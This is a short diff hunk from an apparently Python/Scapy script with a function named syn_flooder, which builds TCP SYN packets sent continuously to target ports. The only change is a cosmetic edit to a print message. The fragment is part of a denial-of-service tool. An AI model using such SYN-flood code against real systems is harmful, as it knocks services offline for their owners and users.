@@ -48,7 +48,7 @@ def syn_flooder(source_ip):
 	# Create the SYN
 	tcp = TCP(sport=RandShort(), dport=g_dest_ports, flags="S", seq=42)
 
-	print("Starting SYN flood")
+	print("[*] Starting SYN flood")
 
 	# Create the packet and continously send it to all the specified ports
 	pkt = ip/tcp
